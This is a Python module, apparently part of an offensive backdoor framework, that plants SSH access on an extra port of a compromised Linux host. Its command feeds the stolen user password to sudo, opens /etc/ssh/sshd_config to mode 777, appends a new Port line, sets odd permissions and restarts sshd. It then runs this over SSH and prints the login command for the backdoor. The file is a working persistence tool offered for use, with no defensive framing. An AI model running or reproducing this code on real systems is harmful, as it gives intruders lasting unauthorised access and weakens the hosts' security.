from backdoors.backdoor import *

class Ssh_port(Backdoor):
    prompt = Fore.RED + "(ssh_port)" + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using ssh_port module..."
        self.core = core
        self.options = { #~Input extra options. You almost always need a port.~
            "port": Option("port", 53932, "Port to add ssh to", True),
        }
        self.allow_modules = True
        self.modules = {}
        self.help_text = "Adds ssh to an additional port."

    def get_command(self):
        return str("echo " + self.core.curtarget.pword + " | sudo -S chmod 777 /etc/ssh/sshd_config;" + " echo " + self.core.curtarget.pword + " | sudo -S echo \"Port " + str(self.get_value("port")) + "\" >> /etc/ssh/sshd_config; echo " + self.core.curtarget.pword + " | sudo -S chmod 611 /etc/ssh/sshd_config; echo " + self.core.curtarget.pword + " | sudo -S service sshd restart")

    def do_exploit(self, args):
        self.core.curtarget.ssh.exec_command(self.get_command())
        print("Backdoor attempted. You can access this backdoor with ssh " + self.core.curtarget.uname + "@" + self.core.curtarget.hostname + " -p " + str(self.get_value("port")))
        print(GOOD + "Module success")
